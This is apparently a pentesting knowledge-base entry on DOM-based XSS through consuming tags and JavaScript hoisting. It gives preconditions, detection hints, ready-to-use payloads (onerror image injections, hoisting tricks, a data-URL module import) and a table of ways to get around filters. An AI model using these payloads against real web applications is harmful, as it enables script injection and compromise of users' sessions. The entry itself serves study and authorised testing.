---
title: DOM XSS — Consuming Tags and JS Hoisting
slug: consuming-tags-and-hoisting
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/consuming-tags-and-hoisting]
inbound: []
---

# DOM XSS — Consuming Tags and JS Hoisting

## Pattern

**Consuming tags** are HTML elements that treat their content as raw text — `<noembed>`, `<noscript>`, `<style>`, `<script>`, `<iframe>`, `<xmp>`, `<textarea>`, `<noframes>`, `<title>`. An injected string that opens a consuming tag can "swallow" the application's subsequent HTML (including a closing quote or angle bracket that the sanitizer expects), causing the parser to reinterpret what follows the consuming tag's close as HTML. This is a form of parser confusion / mXSS.

**JS hoisting** exploits JavaScript's `var` and function hoisting rules. If an injection point appears *before* a variable or function declaration in a script block, the injected code can reference those identifiers even though they appear syntactically later in the source, because the JS engine hoists all `var` and `function` declarations before executing.

## Preconditions

### Consuming tags
- The application reflects attacker input somewhere that a consuming-tag open can reach the application's own markup.
- The sanitizer or WAF does not strip the specific consuming tag being abused.
- The browser must be parsing HTML (not SVG/MathML foreign content, where rules differ).

### JS hoisting
- Injection point is inside a `<script>` block, *before* a `var` declaration or function definition.
- Injection string can terminate the current expression (e.g., via `"` or `//`) and introduce new JS.
- The injected value appears as part of a string literal or similar position that the app does not sanitize.

## Detection

Consuming tags:
- Source in context: reflection immediately before or inside an HTML attribute value that could contain a consuming-tag open.
- Grep: look for `<noscript>`, `<noembed>`, `<xmp>`, `<textarea>`, `<title>` in rendered output near reflection points.
- `js_analyzer` sink: `innerHTML`/`outerHTML` where the payload includes a consuming-tag pair.

JS hoisting:
- Injection inside a `<script>` block with surrounding `var` declarations.
- Common pattern: `var myVar = "USER_INPUT";` — inject `INJECTION_STARTS_HERE";var myUndefVar;alert(1);//`.

## Triggering

### Consuming tags

```html
<!-- noembed consuming tag -->
<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>

<!-- noscript consuming tag -->
<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>

<!-- style consuming tag -->
<style><img title="</style><img src onerror=alert(1)>"></style>

<!-- script consuming tag -->
<script><img title="</script><img src onerror=alert(1)>"></script>

<!-- iframe consuming tag -->
<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>

<!-- xmp consuming tag -->
<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>

<!-- textarea consuming tag -->
<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>

<!-- noframes consuming tag -->
<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>

<!-- title consuming tag -->
<title><img title="</title><img src onerror=alert(1)>"></title>
```

### JS hoisting

```javascript
// Hoisting via undefined variable
<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>

// Hoisting via undefined function
<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//";</script>

// Hoisting via undefined class
<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//";</script>

// Hoisting via undefined jQuery $(document).ready()
<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);(function(){"";});</script>

// Hoisting via parameter of an undefined accessor (object syntax)
<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>

// Hoisting via parameter of an undefined accessor (array syntax)
<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>

// Hoisting via undefined accessor (module type + import)
<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>

// Hoisting via native function hijacking
<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject = "INJECTION";function atob(){alert(1);}//";</script>
```

## Bypasses

| Defense | Bypass |
|---|---|
| Strip `<noscript>` | Try `<noembed>`, `<xmp>`, `<textarea>`, `<title>`, `<style>`, `<noframes>` |
| Sanitizer closes consuming tags before reflection | Parser-confusion depends on specific browser; test Chrome vs Firefox separately |
| Escape `"` in JS strings | Use hoisting via array syntax `undef01['undef02','INJECTION'+alert(1)]` — no quotes needed |
| Block `import` | Use `eval(myUndefVar)` pattern without module type |
| Inject position is after all `var` declarations | hoisting only works when injection is syntactically before the hoisted declaration |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed.)
